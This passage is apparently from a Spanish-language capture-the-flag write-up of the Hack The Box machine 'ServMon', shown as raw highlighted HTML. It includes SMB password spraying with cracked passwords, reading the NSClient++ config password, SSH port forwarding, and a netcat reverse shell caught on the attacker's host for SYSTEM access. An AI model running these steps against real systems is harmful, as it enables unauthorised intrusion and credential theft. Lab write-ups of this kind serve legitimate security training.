SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:L1k3B1gBut7s@W0rk
 œÄ ~/htb/servmon ‚ùØ cme smb 10.10.10.184 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;nadine&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;L1k3B1gBut7s@W0rk&amp;#39;&lt;/span&gt; --shares
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;18362&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:SERVMON&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:ServMon&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:L1k3B1gBut7s@W0rk
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          Share           Permissions     Remark
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          -----           -----------     ------
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          ADMIN$                          Remote Admin
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          C$                              Default share
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          IPC$            READ            Remote IPC
œÄ ~/htb/servmon ‚ùØ cme ssh 10.10.10.184 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;nadine&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;L1k3B1gBut7s@W0rk&amp;#39;&lt;/span&gt;
SSH         10.10.10.184    &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;     10.10.10.184     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; SSH-2.0-OpenSSH_for_Windows_7.7
SSH         10.10.10.184    &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;     10.10.10.184     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; nadine:L1k3B1gBut7s@W0rk
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ingresamos por medio de SSH, logramos obtener la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.18363.752&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; Microsoft Corporation. All rights reserved.

nadine@SERVMON C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;adine&amp;gt;whoami
servmon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine

nadine@SERVMON C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;adine&amp;gt;type Desktop&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt
924e7dffa2f7c2e53e3c9c1bc6211065

nadine@SERVMON C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;adine&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Realizamos una enumeracion de archivos, y encontramos que existe &lt;code&gt;NSClient++&lt;/code&gt;, tras realizar una busqueda de exploits encontramos que es posible &lt;a href=&#34;https://www.exploit-db.com/exploits/46802&#34;&gt;escalar privilegios&lt;/a&gt; utilizando un archivo .bat, adem√°s un &lt;a href=&#34;https://www.exploit-db.com/exploits/48360&#34;&gt;exploit - Authenticated Remote Code Execution &lt;/a&gt; para ejecutar comandos remotamente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       08/04/2020     23:21                Common Files
d-----       08/04/2020     23:18                Internet Explorer
d-----       19/03/2019     04:52                ModifiableWindowsApps
d-----       16/01/2020     18:11                NSClient++
d-----       08/04/2020     23:09                Reference Assemblies

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Verificamos que NSCP estuviera corriendo, adem√°s verificamos en que puerto esta disponible. Tambien verificamos el archivo de configuracion donde encontramos la contrase√±a y vemos que solo estan &amp;ldquo;permitidas conexiones&amp;rdquo; desde &lt;code&gt;127.0.0.1&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;adine&amp;gt; Get-Service -Name nscp &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Select-Object *


Name                : nscp
RequiredServices    :
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : True
DisplayName         : NSClient++ Monitoring Agent
DependentServices   :
MachineName         : .
ServiceName         : nscp
ServicesDependedOn  :
ServiceHandle       :
Status              : Running
ServiceType         : Win32OwnProcess
StartType           :
Site                :
Container           :
PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&amp;gt; ps &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;findstr &lt;span class=&#34;s2&#34;&gt;&amp;#34;nscp&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;m&#34;&gt;442&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;18976&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;30632&lt;/span&gt;              &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; nscp
PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&amp;gt; netstat -ano &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; findstr &lt;span class=&#34;s2&#34;&gt;&amp;#34;2660&amp;#34;&lt;/span&gt;
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:5666              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  UDP    0.0.0.0:51512          *:*                                    &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  UDP    127.0.0.1:51511        *:*                                    &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; NSCLIENT++
PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;SCLIENT++&amp;gt; cat .&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;sclient.ini
&lt;span class=&#34;c1&#34;&gt;# If you want to fill this file with all available options run the following command:&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#   nscp settings --generate --add-defaults --load-all&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# If you want to activate a module and bring in all its options use:&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#   nscp settings --activate-module &amp;lt;MODULE NAME&amp;gt; --add-defaults&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# For details run: nscp settings --help&lt;/span&gt;


&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; in flight - TODO
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/settings/default&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Undocumented key
&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ew2x6SsGTxjRwXOT

&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Undocumented key
allowed &lt;span class=&#34;nv&#34;&gt;hosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para realizar la explotacion primero obtuvimos el puerto 8443 localmente utilizando ssh.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras obtener el puerto localmente, obtuvimos la contrase√±a, utilizando nscp.exe.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;rogram files&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;sclient++&amp;gt; .&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;scp.exe web -- password --display
Current password: ew2x6SsGTxjRwXOT
PS C:&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;rogram files&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;sclient++&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras analizar el exploit creamos dos archivos, &lt;code&gt;nc64.exe&lt;/code&gt;, para ejecutar una shell inversa que a continuacion se explica de dos &amp;ldquo;formas&amp;rdquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp&amp;gt; dir

    Directory: C:&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       14/05/2021     01:39            &lt;span class=&#34;m&#34;&gt;680&lt;/span&gt; exec.bat
-a----       14/05/2021     01:50          &lt;span class=&#34;m&#34;&gt;45272&lt;/span&gt; nc64.exe

PS C:&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;checkexternalscripts-1&#34;&gt;CheckExternalScripts [1]&lt;/h2&gt;
&lt;p&gt;Para la explotacion creamos un nuevo script en Settings.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_48_23-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le agregamos un alias, el script o comando a ejecutar y guardamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_47_50-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Guardamos los cambios en la opcion &lt;code&gt;Changes&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1319_21_52-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dirigimos a &lt;code&gt;Modules&lt;/code&gt;, activamos y desactivamos el modulo en el check, esto guardar√° y activar√° los scripts creados.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1302_38_41-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Luego nos dirigimos a &lt;code&gt;Modulos &amp;gt; CheckExternalScripts &amp;gt; Queries&lt;/code&gt; donde observamos los scripts previamente creados.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_46_43-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;El script que ejecuta el archivo C:\Temp\exec.bat que contiene una shell inversa para powershell no funcion√≥ con esta &amp;ldquo;forma&amp;rdquo;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Nos dirigimos al querie &lt;code&gt;script_shell&lt;/code&gt; y Run, donde ejecutamos nuestro script.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_51_15-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Luego de esto nuestra shell inversa ser√° ejecutada, con lo cual obtenemos una shell &lt;code&gt;nt authority\system&lt;/code&gt; y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ sudo nc -lvp &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.3&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from 10.10.10.184 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.184&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;52222&lt;/span&gt;
Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.18363.752&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
